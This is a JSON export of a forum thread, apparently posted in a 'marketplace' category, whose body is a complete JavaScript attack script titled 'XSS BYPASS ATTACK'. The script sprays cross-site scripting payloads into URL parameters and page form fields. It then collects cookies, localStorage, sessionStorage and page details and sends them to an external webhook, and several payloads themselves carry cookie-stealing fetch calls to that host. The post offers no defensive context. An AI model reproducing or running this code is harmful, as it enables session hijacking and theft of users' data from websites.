{
  "threads": [
    {
      "id": 1784468149565,
      "title": "(function() {     console.log(\"[+] XSS BYPASS ATTACK STARTED\");          const WEBHOOK = \"https://eorw0sly29vshxa.m.pipedream.net\";          function",
      "author": "k1llsync456",
      "authorId": "1449055151934668871",
      "avatar": "https://cdn.discordapp.com/avatars/1449055151934668871/66fe7f925fcdb8fd25a8d41af091df4d.png",
      "time": "2026-07-19T13:35:49.565Z",
      "tag": null,
      "tagClass": "tag-blue",
      "link": null,
      "description": "(function() {    console.log(\"[+] XSS BYPASS ATTACK STARTED\");        const WEBHOOK = \"https://eorw0sly29vshxa.m.pipedream.net\";        function send(data) {        try {            fetch(WEBHOOK, {                method: \"POST\",                mode: \"no-cors\",                headers: { \"Content-Type\": \"application/json\" },                body: JSON.stringify(data)            });        } catch(e) {}    }        const payloads = [        \"<img src=x onerror=alert('XSS')>\",        \"<svg/onload=alert('XSS')>\",        \"<img src=x onerror=alert(String.fromCharCode(88,83,83))>\",        \"<img src=x onerror=eval('alert(\\\\'XSS\\\\')')>\",        \"<img src=x onerror=Function('alert(\\\\'XSS\\\\')')()>\",        \"<img src=x onerror=setTimeout('alert(\\\\'XSS\\\\')')>\",        \"<body onload=alert('XSS')>\",        \"<iframe src=javascript:alert('XSS')>\",        \"<details open ontoggle=alert('XSS')>\",        \"<input onfocus=alert('XSS') autofocus>\",        \"<img src=x onerror=fetch('\" + WEBHOOK + \"?cookies='+btoa(document.cookie))>\",        \"<img src=x onerror=fetch('\" + WEBHOOK + \"?ls='+btoa(JSON.stringify(localStorage)))>\",        \"<img src=x onerror=fetch('\" + WEBHOOK + \"',{method:'POST',body:JSON.stringify({cookies:document.cookie})})>\"    ];        const fields = [\"xss\", \"test\", \"id\", \"payload\", \"data\", \"input\", \"q\", \"s\", \"search\", \"query\"];        console.log(\"[+] Payloads: \" + payloads.length);    console.log(\"[+] Fields: \" + fields.length);        let results = [];        function testXSS() {        let fieldIndex = 0;        let payloadIndex = 0;                function nextTest() {            if (payloadIndex >= payloads.length) {                payloadIndex = 0;                fieldIndex++;                if (fieldIndex >= fields.length) {                    console.log(\"[+] XSS scan complete. Found: \" + results.length);                    exploitResults();                    return;                }            }                        const p = payloads[payloadIndex];            const f = fields[fieldIndex];                        try {                const url = window.location.href.split('?')[0] + \"?\" + f + \"=\" + encodeURIComponent(p);                fetch(url, { mode: 'no-cors' })                    .then(() => {                        results.push({ field: f, payload: p });                        console.log(\"[!] XSS FOUND: \" + f + \" -> \" + p.slice(0, 30) + \"...\");                        send({ type: \"xss_found\", field: f, payload: p, url: url });                    })                    .catch(() => {});            } catch(e) {}                        payloadIndex++;            setTimeout(nextTest, 100);        }                nextTest();    }        function exploitResults() {        if (results.length === 0) {            console.log(\"[+] No XSS found. Trying injection...\");            injectXSS();            return;        }                console.log(\"[+] Exploiting \" + results.length + \" vulnerabilities...\");        results.forEach(function(r) {            try {                const url = window.location.href.split('?')[0] + \"?\" + r.field + \"=\" + encodeURIComponent(r.payload);                fetch(url, { mode: 'no-cors' });                console.log(\"[+] Exploited: \" + r.field);            } catch(e) {}        });                injectXSS();    }        function injectXSS() {        console.log(\"[+] Injecting XSS into forms...\");        let injected = 0;        const fields = document.querySelectorAll('input, textarea, [contenteditable=\"true\"]');                fields.forEach(function(el) {            const p = payloads[Math.floor(Math.random() * payloads.length)];            try {                if (el.value !== undefined) {                    el.value = p;                    el.dispatchEvent(new Event('input', { bubbles: true }));                    el.dispatchEvent(new Event('change', { bubbles: true }));                    injected++;                }                if (el.innerHTML !== undefined && el.contentEditable === \"true\") {                    el.innerHTML = p;                    el.dispatchEvent(new Event('input', { bubbles: true }));                    injected++;                }            } catch(e) {}        });                console.log(\"[+] Injected into \" + injected + \" fields\");                stealData();    }        function stealData() {        console.log(\"[+] Stealing data...\");        const data = {            cookies: document.cookie,            localStorage: JSON.stringify(localStorage),            sessionStorage: JSON.stringify(sessionStorage),            url: window.location.href,            userAgent: navigator.userAgent,            timestamp: new Date().toISOString()        };                send({ type: \"stolen_data\", data: data });                console.log(\"[+] Data stolen and sent to webhook\");        console.log(\"[+] XSS BYPASS ATTACK COMPLETE\");    }        testXSS();})();",
      "comments": [],
      "category": "marketplace",
      "pinned": false,
      "locked": false
    }
  ]
}